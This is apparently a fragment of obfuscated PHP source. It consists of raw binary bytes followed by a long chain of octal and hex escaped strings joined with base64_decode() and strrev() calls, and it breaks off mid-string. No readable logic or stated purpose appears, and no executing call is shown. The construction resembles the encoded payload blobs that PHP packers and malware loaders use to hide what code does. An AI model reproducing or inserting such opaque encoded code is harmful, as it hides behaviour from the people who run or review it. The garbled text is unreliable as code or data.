Îk‰ı¹Ø?-®ö|?wç{>oÆ[5øàğŞîwMñüàŞÏö}')."\134\274\161\347\203\327\40\370\211\163\104\315\10\154\374\216\53\160\331\7\326\217\157\337\276\373\306\55\74\367\375\7\116\147\244\112\114\117\374\244\10\233\30\202\301\312\42\5\160\127\267\174\112"."\147\126\107\43\246\44\261\305\27\326\117\263\63\172\121\261\211\236\232\206\376\345\315\274\227\342\46\233\143\43\217\263\25\66\326\76\216\277\11\75\127\300\130\10\243\344\247\6\272\302\270\43\110"."\104\233\112\237\66\240\320\13\4\332\52\237\60\52\47\226\240\226\160\257\340\141\315\302\62\176\245\240\27\163\206\205\65\225\25\263\37\33\43\51\370\106\202\141\233\163\41\124\232\104\232\121\1".base64_decode('lfFMCkyowcFaZ5sULOJU+jUUTDUo/ag8u9vpVWyThXOjHLfYuJMxg27R3lZcthWxi7eXYVg=').strrev('"û€7.UiÅ2)´(ğÑQ6	!ÎYÉü“„(9ˆ“€èM˜eP·¢2@ô9Dßš').base64_decode('5tWn0HxQA6LFG8o7V9QRY8SoRdAsjNLJAGSWp8HVyXiFAeXddGQiwlGyKwDK4y7Lzg0zmEU=')."\x44\x5a\x5c\x1a\x13\xf5\x9\xd1\x64\x1a\x15\x32\x7b\xdd\x12\xaa\xf5\x45\x3d\x65\x30\x75\x6e\x3d\x47\x20\x81\xb6\xfb\xa4\x1b\x33\x6a\x31\xc6\x75\xca\x93\x68\x7d\x16\x1d\x97\x81\xb\x17\x17\x32\x5\x3c\x90\xf6\x82"."\xc5\x60\x9c\xc1\xac\xa\xa5\x36\x40\x58\x18\xc7\xc9\xa9\x59\xf7\x5\x23\x5f\xcd\xcd\x4d\x92\x17\x10\xc\xd6\xe0\xf5\x7a\x25\x41\xb8\x50\xee\xc3\x21\x95\x75\x8c\x58\x39\xc5\x33\x25\x1b\xeb\xb0\xb4\x66\xcd\x3e\x86"."\x48\xe2\xf6\x1e\x81\x87\xf0\xc4\x4d\x96\xde\xcc\x75\x5e\x10\x79\x4a\xa7\x51\x7d\xd\xc4\x1a\x59\x99\xae\xa0\x3e\xcc\xf3\xd5\xa3\x0\x59\x61\xb3\x7d\x73\x51\x90\xc\x26\xac\xa6\x1e\x18\xe0\x92\xc5\x2c\xbe\xa6\xf8".base64_decode('ZgHbZy0AArGAoE2j1DNIF6VK+SxLRUEEEivlMSI0OIdDz6ekQgu0pC3VqvbDePvEUGnTRb4=')."\236\2\243\112\277\64\200\303\0\300\312\266\73\321\3\365\337\313\61\6\315\74\332\55\123\224\114\302\316\7\125\132\222\343\206\230\100\66\134\234\14\327\127\24\265\145\154\50\240\35\71\317\25".strrev('¶`Ú áâ4	ÅÛu¦¯–6±LÛ%‡µ›4§èC’	¡#a,–j9×“‹l-pîÆ¬­‡').base64_decode('NFqh4LdSA5Yfa74aQ3rE6PNjRxEYeX3clQLZMlStzyzabPzQklJTBjQ0Em5Sm8Mx6cuFkvs=')."\313\262\103\237\100\147\130\215\307\243\122\73\300\24\152\111\264\131\15\106\243\113\302\260\132\32\44\372\217\215\140\205\252\1\216\11\143\130\174\353\46\153\41\312\54\37\166\265\202\171\225\270\2"."\xda\xba\x68\x3d\x6\xdb\x2\x31\x6e\x2d\x31\xdb\x57\xe7\xab\x17\xb0\xe8\x83\x2a\x36\xd\x69\x64\xfe\x1b\xe2\x89\x40\xac\x82\xc3\x1d\xea\x88\x7\x30\x3\x9c\xef\x40\x81\xb6\xe8\x32\x25\x18\x8d\x74\xb5\x77\xc4\xa9"."\237\31\232\336\21\225\362\211\116\74\144\63\167\74\345\331\120\175\250\63\22\10\206\224\160\107\42\312\114\133\270\62\62\61\152\212\363\70\33\202\242\245\163\167\73\120\236\106\144\303\53\271\106".base64_decode('XhOspW5PdU9Vz7Semp7alb4eq9cv7ciGPD0Q6WyG7jXwUMoCBGqPo52bBqOxQDDCmoLQEYI=')."\321\140\230\6\166\135\362\323\235\77\277\140\327\325\133\307\317\335\210\52\232\270\152\375\304\345\367\42\76\17\363\166\133\317\337\365\320\5\23\227\334\71\161\76\360\144\312\356\73\357\333\371\340"."\xc3\xbb\x2e\xd9\x32\xbe\xf5\x8a\x89\xcb\xee\xdf\x75\xd5\x19\x34\xe3\xed\xdb\x7f\x3a\x7e\xde\x16\xde\x30\xe5\xed\x8b\x1f\x9a\xb8\xe0\x16\xce\xef\x51\x36\xcf\x83\x4a\xbf\x7d\xe6\xc6\x5d\xf\x6e\xc5\xdc\xde\x4d\xeb".base64_decode('Ju75wcQ1G8fPu3H8yi27Lrhz/Icbxs/auPvOS491IxKNd7OpALN8/ynYpQId3h5rOh7aWvQ=').base64_decode('W4NtaNAvMwUgSuEndYU6giG35ZkcBV9F0yiGUEUoYPUt8HXE4sS3SWP1pK1YA/MvNUpqTHM=')."\50\36\214\205\233\102\140\245\301\47\152\12\141\264\100\227\5\245\306\143\113\171\230\33\52\227\371\226\122\152\30\62\327\52\216\216\150\276\244\231\55\345\362\244\261\112\25\326\312\253\362\140\62"."\x43\xcc\xe0\x94\x2a\xbc\xdf\xa3\x4\x1d\x3b\x62\xa8\xc1\x9e\x67\x88\x6e\x77\xf5\x8a\x6a\x4f\x9d\xa7\xbe\x56\x1\xc7\x53\xb4\x4\xb8\x9b\x52\xaa\xc0\x44\x80\x97\x73\x7c\xc4\xd3\xe7\x88\xd5\x7b\xea\x6a\x95\xaa\xc2".base64_decode('QBW0S4wrar1KIS1F89RAg+XmClhExiy7qBmIrilJD0/i5dGvw4VU0idK0HlCEO40JdDR7IQ=').base64_decode('pJ6nOquJhm3SZ3MXNmyaq2uVPrB9qZBJijkGo9ExGDXTgU50tvL5poYtCrVupM3SLDZRkEo=').strrev('÷‚¾Ğ¯ğ:‘šVs?iKåX%Äy'."\n".'ÄŸ:qlâ9šğ~<'."\n".'šê&°bÙÒ§'."\n".'¦')."\xe1\x32\xd7\x32\xe3\xe\xc5\xb0\x9d\x66\x28\x11\x6c\xa3\x58\x1e\x97\xd0\x3c\xd5\x37\xc5\x81\xa8\x62\x38\x15\x7\x8a\xf0\x53\x18\xc0\xd1\xe5\x82\x9\xc2\x81\x4\x2e\xdc\x81\x8d\x78\xa9\x7d\x62\x3c\xd8\x16\x6a\xf".base64_decode('+ICIU0yg8JgTVBqVakz5aFK1Y/jJh9iQJchX0bpSbcS70VEopKExMPsKcRShkSKN1dS1D1Q=')."\311\75\337\105\143\11\25\15\0\220\147\211\352\126\113\273\205\144\7\200\15\360\206\30\273\331\217\230\61\223\71\51\112\365\61\7\171\250\162\134\147\60\332\321\22\146\246\230\315\114\54\316\304"."\206\0\324\34\13\143\317\55\360\175\205\125\45\31\300\242\210\320\234\101\221\302\160\212\207\205\367\13\234\301\367\174\24\21\133\76\212\360\315\6\103\111\236\374\360\367\343\35\74\54\130\161\24".base64_decode('6YozkxxMfZc183AbN1jHGdGYFAnEAu1xHo0t4yY+PI2a+qgdXe2C4kcCSxGyRAWDwqh1jW8=')."\332\342\332\36\152\107\111\203\364\347\4\26\303\266\145\275\253\353\75\312\234\265\265\0\303\135\236\330\31\43\317\30\136\374\225\223\42\152\44\332\112\343\304\303\140\50\237\22\47\47\245\133\101"."\334\167\102\160\337\26\333\272\370\152\120\20\16\53\324\4\133\351\210\56\13\10\247\165\122\6\244\10\37\166\376\123\272\173\206\173\174\210\131\260\126\12\273\310\346\46\205\261\41\304\371\15\34"."\x32\xa1\x74\x80\x6d\xa3\x2b\x3d\xb0\x63\xa8\x59\x33\xcd\xdc\x52\x21\x82\xc8\xd8\x5\xfa\xbb\x9c\x5\x8\xad\x84\x2\x49\x62\x5e\x3f\xc2\x1b\x11\xf0\x9e\xac\xf6\xac\xe9\x99\xda\xe3\xf5\x51\x63\x54\xcc\xbc\xf4\x78"."\x44\x93\xd4\xd0\x72\xb4\xc7\xc6\xe3\xe\x4b\x5a\x35\x87\xad\xf3\xa1\x76\xd4\x4b\x8\xd1\x55\x4b\x23\xb\xe1\x7\xce\x86\xb\xe1\x70\x2\xd1\x45\x8d\x7c\x32\x43\x27\xad\xe9\x40\xff\x5a\x13\x6b\x42\xe8\x5f\x4\xfd".base64_decode('RBJougwOgJZkJLwktAb/JzJq+UBSSzNngXDHGvQ/IjBrwh3uyppCiWWhEAVgYfgVoIjgQFc=')."\45\17\224\330\372\3\262\205\65\10\124\255\252\65\144\60\275\275\323\153\125\325\157\165\1\276\160\307\55\65\325\307\327\127\303\36\22\210\7\5\365\165\40\104\71\56\20\133\15\47\42\160\277".base64_decode('ihBvjUW7OqV4W2BpuKOVxfzMpkGZBlUrzeE4GqIgQ0bh7lGOA8NJ2CKZ63WgdDOi7Cgisew=')."\370\60\100\51\263\163\225\65\165\205\43\315\262\213\0\14\10\33\12\241\352\260\247\114\141\215\143\161\342\54\200\105\360\220\263\60\101\67\26\41\143\300\42\164\0\130\214\14\27\213\20\267\222"."\54\102\72\312\42\370\164\22\352\140\171\350\240\212\16\231\354\364\231\321\206\270\365\353\202\124\237\344\325\5\323\140\37\25\62\142\267\77\350\370\246\161\321\262\113\56\114\144\151\222\364\201\152"."\x59\x2a\x92\xa9\x3d\x16\x30\x4b\xf2\x2f\x3f\x85\x40\xcc\x27\x81\x41\xbf\x3d\x2b\x17\x13\xe6\x78\x25\xc3\x53\x6a\xf8\x6d\x27\xc\x3b\xeb\xf8\x28\x98\x85\xa2\x8f\x86\x89\x55\xae\xf4\x59\x66\x3e\x43\xe4\xa9\xaa\x29"."\x89\xff\xc9\xbe\x2d\x27\x8\xd1\x19\xbd\x2b\x0\xe1\xb7\x90\x3b\x61\x65\x53\x22\x16\xa7\x51\xe7\x89\x8a\x93\xa9\x95\xfc\xa0\x4\x6e\x3e\x3c\xf0\xb\x2d\x3a\x98\xfe\xf4\x40\x94\x9\x52\x7a\xe0\x23\xd5\x1e\xd8\x74"."\x7b\x18\xc3\xde\xdd\x33\x52\x57\xe7\x45\xff\xcd\x43\xff\x9a\xd0\xbf\x20\xfa\x17\xc2\x9\x2d\x3d\x23\x73\x5b\x50\x60\x7e\x4b\xaf\x1f\xae\xfd\x7a\x7a\xaa\x26\x1b\x4e\x0\x60\x83\xa\xd1\x2a\x1a\x65\xa5\xc\xbe\x47"."\46\63\330\255\220\152\347\330\275\3\71\314\11\131\76\275\137\20\361\346\130\264\223\162\54\112\270\105\241\136\66\224\152\172\43\121\15\254\130\60\26\302\253\211\102\261\274\232\152\207\170\155\121".base64_decode('tQLG+LXOUuGO5tBypdpIjaiapkJhBa1dVpFSVhOrgbYVbt+sjDmsyOjIztcgLU8IFC1j5Yg=')."\277\14\146\356\354\201\103\74\317\241\34\64\315\12\307\321\6\37\211\220\236\242\54\303\302\214\257\107\341\156\55\160\42\76\254\120\141\56\124\304\62\150\105\64\53\264\74\21\13\340\104\302\255"."\36\164\40\372\103\10\20\76\115\25\163\32\265\1\46\74\236\157\45\10\25\126\72\130\112\312\154\142\246\22\60\214\154\221\122\237\170\16\221\54\320\141\226\345\16\113\200\113\247\261\316\130\270"."\x3d\x10\x5b\x1\x43\x26\xce\xc\xb0\x44\xcd\xac\xc3\x12\x5c\x44\xc\xab\x4b\xf2\x4a\xd0\x81\x5a\x2d\x7b\x29\xa0\x73\xcc\x29\x32\x3a\xff\x32\x8a\x8c\x5a\x43\x83\x55\x78\xe6\x69\x10\xbc\x6\xab\xdc\xd4\x9c\x9\x5d".base64_decode('apjJtocFmIsPYg3HxGs5RKJ4TMwa4D7Mipwr2/MJt8Z4U8WTzHaHlkBXRE6BoVKWhFZ8xRo=')."\x61\x2d\xad\xb4\x46\x58\x1e\x13\xdf\x88\x9b\x34\x3e\x16\xd0\xb3\x9a\xd9\xd0\x53\xea\x8d\xa4\x66\x6\x3a\xcd\x96\xf2\xd8\xfd\xe\x13\xc9\x9\xc3\xf8\x21\x2c\xcd\xd3\x8a\x35\x33\x66\xb3\x42\xac\xed\xb0\x63\x77\x25"."\xa2\x2a\xda\x95\x62\x21\xbc\x47\x94\xf5\x45\x3a\xc3\xcb\x13\x6\x85\x31\x0\xf7\x1f\xfd\x15\xdd\x66\x30\x95\xba\xcd\xcb\x73\x29\x56\xa8\xa3\x35\xdc\x11\x6a\xc4\x46\xf7\x88\x57\x60\xcd\x5\x39\x1d\xf6\xa7\x3a\xf".base64_decode('6glH1Qjir1VZFBeOgtTa4axTVYVXG58mtPftYknydWiYRFO+nRvVENV+hCwB4eeCS9ZJXqk=')."\17\227\226\267\76\50\357\362\211\153\230\15\70\7\3\123\216\147\201\0\127\35\37\167\253\306\313\311\102\153\137\334\267\263\353\175\356\53\21\12\164\111\176\52\310\365\20\373\40\271\277\312\273"."\233\207\55\350\333\231\353\40\264\367\146\231\157\65\125\27\235\313\351\226\305\257\341\23\31\135\261\12\172\222\370\144\125\300\165\240\222\62\345\33\106\230\12\162\4\143\101\73\43\34\174\310\316"."\214\233\233\140\252\234\6\346\71\154\321\30\327\263\160\337\320\334\107\214\47\204\205\244\260\77\223\214\52\110\15\142\136\251\213\106\127\101\250\51\314\7\116\202\22\211\21\341\314\30\137\340\210"."\72\173\231\134\101\14\317\230\301\266\117\367\335\54\157\144\336\354\344\327\254\313\304\245\24\354\120\250\2\347\245\55\57\47\117\2\276\53\55\203\304\176\115\276\152\206\231\127\60\322\62\311\74".base64_decode('FkcZycg5zO9KefQRr2yLhjCLJErWL8yfJY3NBf0bhL0QSEMK+y2yHJ/wg0TqxJyXV3gjSWk=')."\xb2\xc5\xb0\xf4\x22\xc0\xb1\x32\xe2\x90\x29\x17\x98\xdf\x6f\xc8\xae\x49\x7c\xc2\x1f\x34\x5f\x4c\x27\xf0\x89\xc2\x86\xf6\x5e\x86\x70\x8\xbb\x54\xa9\x2d\x9d\x1c\x5e\x78\x82\xa5\xa3\x21\x4d\x3\x49\xa0\x41\xb2\xfc"."\225\6\321\210\66\3\57\207\121\11\167\244\124\276\312\300\33\165\304\114\163\312\205\230\133\160\326\346\240\136\341\50\224\365\351\330\26\216\132\46\205\270\367\116\124\220\372\330\373\372\102\135\222"."\103\356\111\10\116\305\162\101\0\344\37\54\22\301\324\327\177\60\246\13\176\1\25\43\246\207\137\133\110\20\140\362\45\122\110\42\332\256\62\4\35\251\231\24\314\174\6\262\5\216\241\235\242"."\x23\xaa\xb6\xa1\xcd\x28\xca\xd8\x19\xc3\x4a\x38\x88\x3f\x2b\x5\x24\xc4\x46\xdc\x56\xd2\x4f\x6c\xc0\xe1\x70\xb9\x80\x5c\x7d\xd1\xdb\x5a\x98\xec\xd5\x88\xae\xf3\x10\x53\xc6\x1\x7f\x6f\x82\x8d\x8\xd0\x9f\x15\xb9"."\x94\x17\x35\x1c\xb0\x2e\xa5\xdb\xdc\x3\x17\x31\xaa\x95\xfc\x83\x49\x16\xf4\x39\x4e\x6f\x87\x25\x97\xbb\xda\x90\x8e\x2d\xd\x99\xe8\xa6\x4c\xdd\x9\xba\x52\xde\x39\x68\x22\xbe\x5b\x8b\x47\xbb\x62\xec\x1e\x8\xc7".base64_decode('sfxLjYWCK/iVDE9tCSx1p4Sx/DLQWjGZS9VwOjm+qrEoFj+GIi2uAvE27r3ZmaZGwh1LKmY=')."\x20\x76\xa5\x5d\x2a\x42\x13\xc3\x89\x50\xbb\x3b\xcd\x59\x43\x3c\x14\x88\x31\xd7\xe2\x38\xde\x14\x89\x6\xa5\xec\x70\xb4\x7c\x24\x38\x3f\xc4\x13\xa9\xf0\x92\x26\xfa\x4f\xa9\xe9\x59\x4d\xce\x53\xd\xe8\x58\x95\x5a"."\x83\xa5\x1c\x5e\xb5\x77\x7a\xed\xe2\x9e\xb5\xb5\x35\x3d\xfe\xc5\xbe\x69\x5c\x38\x47\xc9\x95\x64\xa9\x3d\x49\xb2\xc5\x36\x9f\x6\x77\x2\xde\xb7\x58\x22\x2d\x6\x31\xbf\xcf\x7\x1f\xe1\x1\x7f\x8f\x9f\xb9\x79\xf3"."\213\114\370\25\360\307\271\366\30\160\345\37\247\76\263\34\15\165\71\224\141\56\32\174\156\163\100\225\331\0\62\312\252\365\63\235\210\60\275\342\125\343\53\342\174\256\234\151\16\214\244\70\55"."\xab\x86\xb8\x80\xd1\xbf\x4e\x19\x14\xab\x47\x55\x4\x74\xa0\xb4\xc3\x42\x5e\x4e\xf2\x19\xa6\x58\x2d\x62\x59\xa7\xcc\x64\x9\x7b\xe9\x12\x73\x24\xec\xe9\x51\x92\x4f\xae\x42\x5e\x80\x86\x9\xdc\x4\x33\x6f\x26\x6"."\377\260\364\261\64\2\202\156\7\3\142\147\246\321\146\107\33\321\216\61\40\104\24\360\325\70\43\17\171\264\31\303\156\37\104\114\163\153\133\370\304\45\221\366\216\150\347\111\261\170\242\153\351".strrev('Z,å\'“<(åGÌó5ÉØˆ4DòKÌ¿-Ò|RÄNö!şÙ+à2ËÅ~ÊÃkµÀ+å²').base64_decode('mz+Xt+sngegs6n2maU+Su7T9qyuGzO4eq5cvg5Q+xDqtg+qw0GS0xHEQ2Bmv/HAFXhcyo5o=').base64_decode('6nPxHZCQ5aylxJ2IRO7vnEZHdaEwag5L/sLZ8kTFgWcD/8Wt2F0vc887SLytul21Dnq1AUc=')."\276\360\41\76\350\105\7\150\107\334\345\256\165\52\331\153\332\315\164\161\206\337\306\355\314\243\375\11\332\2\34\213\274\34\311\236\305\265\250\360\316\330\346\42\6\74\221\273\166\211\23\75\331".base64_decode('BmUWPATRgnj7lNJN2XW4fsCsHnnLgEY9ivCxzgTHTufpbD3iVSUZVidlxx6MuucGhBZNboA=')."\353\254\44\35\334\15\146\44\104\254\50\61\60\360\132\13\312\153\32\145\113\23\314\225\233\106\143\322\73\124\16\247\52\362\373\66\132\241\20\314\340\76\70\326\260\43\51\51\107\372\261\46\217"."\xac\x2d\xe4\xf4\xe0\x8e\xb2\x9b\x29\x17\x99\xe2\xf0\x96\x8\x71\x97\xec\xfd\x92\xb3\xf6\xb2\x1a\x10\xc7\x99\xf\x31\xcf\xc\x65\xb9\x88\x3d\x35\x44\xf6\x57\xb7\xa5\x9d\xc\x2f\x7\x76\xa8\x64\xa6\xd8\xde\x64\xb1"."\x45\x39\x75\xc4\x6b\x5a\x96\xb7\x50\x34\xb1\xbe\x60\xa3\x91\x4b\xfb\xad\x61\xc8\xcb\x6a\x96\xbd\xd4\xe1\xb\xeb\x6b\xbd\xb4\x63\x9f\x2e\xed\x9c\x5f\x87\x26\x8c\x78\x9\x56\xb3\x8f\x40\x51\x9c\xe4\x2f\x12\x1d\x2a"."\xcf\x30\xec\x4f\x1e\xe2\xa3\x55\xad\x63\x8\xe3\x47\x6d\xf3\x63\x77\x9e\x84\xb1\xe6\x6a\x7e\xd1\x38\xbb\xab\x72\xf6\x9e\xaa\x34\x49\x82\x0\xf0\x23\xd8\xca\x34\x8b\xb8\x43\x74\xe1\xff\x9a\x5e\x31\xd0\xb0\xf0\x1b".base64_decode('jc4HgTR2cWPm2StM9H0M2Xt+SifN5Z4ZJMfz+I0WtNSZJqTkgh5xnGk+jcQjtOzlEw+5N+c=')."\170\232\205\116\220\323\261\273\245\353\3\114\163\23\317\266\240\50\105\356\177\237\336\74\173\53\46\170\45\135\114\272\236\244\47\73\360\347\100\356\220\241\217\201\100\173\351\317\311\225\132\357\55"."\xa\x97\xf8\x68\x76\xe8\xd3\x22\x4b\xf4\x51\xe6\xba\xfc\xab\xbd\x9f\xf7\xb4\xf6\xb4\xf7\x24\xe4\xee\xda\x45\xad\xbf\x1f\x35\x56\xf2\xd9\xcb\x27\x51\xf8\xc0\x7\x4c\x22\x4f\xec\xb0\xee\x4f\xee\x41\x1f\xae\x54\x62"."\xb4\x6b\x41\x7c\x7a\x1b\xc1\x4f\x9c\x8\xff\xb0\x5d\xb1\x88\xe3\x2a\xc\x40\x59\x27\xc6\x32\xde\x20\xd3\x35\x33\x4b\xd9\x14\x39\x11\xa3\x2f\x9a\xd9\x21\x5d\x11\x97\xe2\x13\x97\xdf\x30\xb1\xed\xd2\xdd\xf\x5f\x37"."\161\301\55\73\267\357\230\270\346\347\64\235\16\112\263\236\347\123\73\361\203\213\166\355\270\166\367\326\207\337\276\174\353\373\17\234\277\373\316\373\260\322\323\365\267\120\35\250\361\115\353\47\56".strrev('mà”ï;îår_oMü`xn&E ¡‰.˜ mQÄò8°õºóü/+íá»\\Nçâc9ï»yÓ|k½')."\254\222\227\225\126\7\232\250\361\263\316\174\173\303\226\361\115\233\167\135\162\175\131\1\372\1\367\124\342\356\135\172\316\256\253\316\220\162\334\205\232\210\337\176\41\6\340\145\150\306\370\205\33"."\x77\xdd\x76\x97\xbb\x10\x7d\xc8\xa1\x42\xa1\x89\xcb\xce\xde\xb9\xe3\x5e\x57\xa1\xe\x33\x5e\x4a\x66\x9a\xa4\x7\x2\x26\xce\x3f\x7b\x7c\xeb\x55\xfc\x23\x3b\xb7\x6f\xa4\x26\x4\xae\x22\x5c\x9\x8f\xc3\xd3\xfa\xcb"."\341\343\14\151\233\115\335\102\133\145\273\146\47\141\235\356\272\343\41\324\36\72\142\362\314\215\337\171\326\256\33\116\337\165\307\271\60\23\127\334\71\176\341\255\23\167\334\264\353\306\255\274\132"."\300\52\207\156\62\256\340\247\353\167\337\173\346\304\345\367\162\100\274\252\123\212\200\41\30\105\141\260\271\4\371\340\256\7\67\357\332\161\15\106\222\363\326\357\132\177\377\370\65\167\215\137\273"."\216\177\166\174\373\166\61\312\121\77\171\210\256\2\75\75\11\247\3\105\355\27\112\255\205\222\364\26\242\114\303\60\327\305\265\110\261\240\213\276\271\301\230\51\362\74\6\274\344\324\310\326\45"."\32\307\174\223\231\202\261\137\135\205\250\143\125\103\325\361\65\350\267\266\312\123\205\17\61\44\216\351\43\116\40\355\250\152\70\276\206\4\152\301\221\326\30\154\15\222\263\155\261\360\100\70\274"."\30\21\10\351\12\165\61\331\151\360\76\66\303\77\303\317\366\266\305\203\370\213\342\375\265\56\276\245\10\226\217\156\56\364\245\34\166\317\332\241\333\303\146\121\326\362\236\121\7\246\142\31\151"."\x6b\xc8\x59\x40\xe4\xe9\xb\x16\x42\x76\x6\xa8\x47\xb5\x1a\x2f\xdc\x58\x8e\x74\x50\xa0\x8f\xea\x51\x3b\xc0\xef\xbb\x7b\xfc\xcc\x6d\x6f\x5f\x7e\x87\x1b\x96\xa\x67\x0\x16\x73\x60\x65\x8f\x77\x52\x1b\x9b\xf1\xcd".strrev('”´aWorÂhï€Ú&TEY¿şø¡/Òp‹¿`€Q8RH«Ê¦H.%×f¿OÇ€Æ¿;À”W')."\367\142\51\231\67\56\273\140\165\275\101\125\347\204\307\162\56\47\274\314\22\44\305\326\232\23\101\372\66\126\203\42\277\134\47\371\224\47\62\124\272\167\61\345\52\110\303\334\2\113\22\234\103"."\277\260\50\302\14\200\352\144\0\116\160\265\27\53\307\170\21\27\217\327\30\132\270\266\41\75\12\41\203\70\237\102\163\77\220\346\36\5\122\4\13\135\275\362\343\154\43\350\20\206\263\361\103"."\x3a\x5e\x2c\xc2\xf5\x1a\xa9\xc9\x72\x4\xe1\xa8\xd8\xd4\x24\x3c\xbd\x51\x9\xa4\xab\x64\xa4\xdc\x9f\x24\x4a\x40\xde\x52\x89\x7d\xb0\x62\xa5\xf2\x11\x91\x1\x90\x4e\x84\x79\x7d\x8e\x37\x64\x34\x34\xd7\xfc\xe\xd3"."\375\104\215\70\137\153\345\57\250\254\310\245\224\31\63\33\146\317\107\177\151\312\124\246\303\124\52\60\343\10\24\144\57\254\34\353\357\147\264\106\74\155\306\372\206\47\134\172\367\307\221\54\206".base64_decode('kb+nwoiUA0601vEwH3SUyo+kh4rIdRIlUVizT+UPOlWg1gZ7rCsvTs58HtIsUOSneE2sjL4=')."\354\200\350\0\41\53\200\330\3\250\175\246\70\13\21\56\124\42\10\311\114\51\77\320\50\145\52\266\151\52\71\55\77\12\107\314\51\126\303\24\153\1\376\120\43\66\174\261\246\260\327\274\360".strrev('S°Àf+;:¡ÜØ5¥'."\r".'´îÕÒ# Ğ—ÑË°é¡\'A1ÌbõŞ>iø|ÊoCeÏRÊ¼$Æ')."\201\65\126\325\361\255\222\336\145\245\241\205\350\164\245\44\261\151\125\143\25\116\255\122\254\142\222\271\136\257\362\203\362\32\1\20\134\320\102\3\212\124\343\42\112\77\302\11\57\11\321\354\352"."\105\13\375\6\224\364\371\217\303\64\332\217\325\366\362\123\361\324\311\132\104\44\265\105\70\177\123\224\205\232\102\207\253\261\232\134\277\124\53\31\264\217\163\235\345\105\356\302\374\55\275\205\176"."\x4d\xce\xc4\xab\x25\x66\xb2\x23\x20\x3f\x76\xf\x71\x37\xa9\x15\x6f\xde\x2\xd2\xcb\xc\xe4\x31\xab\xa0\x96\x5f\x5a\x5e\x4\x57\xee\x4b\xca\x59\xec\xd1\xd3\xc\x11\x17\xb8\xee\x78\x17\x16\x16\x2d\xc4\x17\x46\x4c"."\61\320\117\42\13\375\205\105\362\154\23\373\267\362\217\371\211\264\310\57\304\23\52\175\236\266\362\65\47\277\335\253\200\107\130\211\7\41\77\323\236\320\222\3\30\21\305\26\1\315\200\214\116"."\54\154\240\31\216\167\152\154\111\357\252\204\355\125\311\135\121\121\74\363\267\172\65\255\10\277\301\264\166\155\171\32\150\162\273\263\2\5\303\235\204\21\316\235\206\205\76\42\15\355\165\316\317"."\x50\x64\x97\x81\x44\xa\x83\xa1\xbf\xa2\x4c\xa4\xa3\x55\x44\xe8\x71\xdd\x91\xd9\xcd\x74\xb0\x48\xac\xa7\xbb\xda\x37\x6d\xed\x5a\xbf\xc1\xf4\x1d\x99\xae\x15\x2b\xeb\xe3\xd0\x34\xde\xe3\x73\xc2\xa3\x9e\xc0\xd0\x73"."\x40\x48\x70\x43\x52\xa4\x3a\x11\xb0\xe8\x20\xff\x34\x61\xfc\xca\xf5\x1a\x15\xac\xec\xd8\xd8\xb8\xa8\x9b\xb3\x57\xbd\x2c\x4f\x25\xb2\x12\x79\xee\x18\x7b\x6a\xd4\xcf\x63\x48\x81\xce\x8f\x89\x65\x3c\x18\xec\x10\xc"."\70\137\106\224\60\371\210\324\56\340\364\5\277\130\274\204\110\307\131\16\7\12\5\7\5\142\21\174\161\226\65\372\374\234\154\320\313\64\137\122\330\206\62\20\102\264\134\351\130\115\321\225\201"."\15\324\110\362\20\242\252\146\221\223\71\236\216\352\342\211\200\346\230\24\111\224\207\147\57\264\222\105\243\140\73\310\40\175\343\273\212\74\232\267\112\33\322\50\110\225\2\22\271\306\52\362\20"."\112\25\132\322\64\207\321\76\336\300\205\370\153\210\47\316\66\126\221\116\130\31\135\107\345\11\151\253\364\21\124\260\112\141\304\67\247\361\161\54\332\46\332\104\271\251\41\74\131\332\25\3\263"."\250\100\7\134\141\36\167\12\375\75\376\70\206\111\344\75\325\54\142\226\211\321\7\41\163\204\43\357\307\222\126\12\4\117\247\166\306\242\211\150\220\275\67\350\24\311\322\264\131\354\164\141\121"."\53\133\161\40\143\66\173\134\327\211\101\160\266\302\17\51\200\15\305\122\76\317\325\114\61\276\362\355\260\261\362\237\156\162\313\252\247\172\47\311\127\272\65\166\7\13\162\143\172\251\314\154\144"."\xa1\x9d\x68\xe3\x4d\x60\xd7\x6\x16\x24\x4b\xae\x64\xb1\x23\x5b\x3d\xe5\xeb\xa6\xbe\x1b\x1a\xeb\x98\xe1\x16\x53\x6a\x15\xe6\xa5\xc\x52\xce\x51\xf0\x4e\xd2\xcb\x47\x1d\xad\x7f\x3f\x90\x4f\xb1\xb2\xaa\xf1\xb5\x21".base64_decode('PAVW7amu8U2rrS7PoerDznysm6eeGEeZ8PAWcATEMjIYCYc6EmoYmIH6GXN9dcJq0bCEa2Y=').base64_decode('Gg5yxaeiTkbV5+hWhaGh1yoJrvyq5x1SVjqkWZM5DZ5RV1fnratHf5k1B3NV2lBXVwZSV9c=')."\100\376\322\14\162\265\1\50\350\314\101\44\221\321\162\0\30\326\165\150\20\354\235\350\210\134\142\214\150\167\20\333\273\52\270\151\60\55\102\171\27\141\37\361\345\313\310\252\343\65\127\205\350".strrev('4'."\r".'˜ş[ª|¡¼ğÆ -b`F»7;h 4¨ÔM¶Îóõ'."\0".''."\r".'ÙÛ´çïƒ ^“ƒL@')."\115\24\117\40\170\131\206\127\176\211\10\12\121\242\47\256\10\35\115\103\145\234\16\203\161\12\142\212\222\274\317\70\101\222\306\142\216\127\162\202\214\243\362\115\40\311\346\266\313\44\226\345\136"."\143\160\264\203\327\104\37\274\242\126\303\60\206\25\126\144\306\34\126\5\237\202\243\47\362\30\31\122\174\344\144\50\231\222\354\313\361\270\262\375\111\2\347\352\162\102\233\10\30\70\342\357\144"."\300\310\72\334\61\250\122\121\171\154\27\140\100\326\223\204\263\44\176\171\33\67\324\213\333\335\40\106\21\321\267\0\177\12\214\152\127\263\366\52\100\161\150\224\274\202\100\237\234\46\202\235\206"."\x83\xca\x26\xdc\x76\x4f\x36\x99\x37\xc7\x85\x86\x5b\x6f\x91\xc5\xa4\xd9\x63\x77\x5c\xf1\xaf\x51\x2d\x64\x29\x21\x96\x40\x6f\xe7\x82\xdc\x83\xb0\x54\x81\x3b\xcb\x55\x26\x40\xaf\xc6\xca\xa\x40\x7a\x39\x34\xb9\x41"."\254\0\215\323\135\320\304\127\160\220\273\104\227\35\10\123\231\224\244\244\146\301\273\60\102\103\210\325\61\44\235\120\175\205\242\231\106\230\140\311\203\206\322\73\53\47\163\360\162\310\12\100\274".base64_decode('9TKcnIjvKtlb9oBawoWDluKbpwQaF67hRaJzhUsZQf5in5yIj76yThg5dTjrwGdqZwpv2Vc=')."\40\35\23\201\330\105\55\157\365\313\112\56\14\114\120\51\54\236\222\337\120\125\35\150\302\160\225\251\240\341\21\22\312\36\316\164\232\106\205\24\216\13\340\4\41\176\131\75\1\315\1\362\110"."\x16\x15\xae\x20\xc2\xde\xde\x8e\x3